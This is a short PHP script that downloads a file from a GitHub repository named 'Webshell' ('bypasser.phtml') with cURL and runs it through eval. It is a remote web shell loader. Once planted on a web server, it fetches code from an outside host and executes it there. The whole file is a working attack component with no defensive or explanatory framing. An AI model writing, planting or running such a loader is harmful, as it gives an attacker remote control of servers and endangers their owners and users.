<?php
// PHP file with attributes or code you want to execute
$url = 'https://raw.githubusercontent.com/0xWhoami35/Webshell/refs/heads/main/bypasser.phtml';

// Fetch the PHP code using cURL
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
$phpCode = curl_exec($ch);
curl_close($ch);

// Execute the fetched PHP code locally
if ($phpCode) {
    eval('?>' . $phpCode);
} else {
    echo "Failed to fetch code";
}
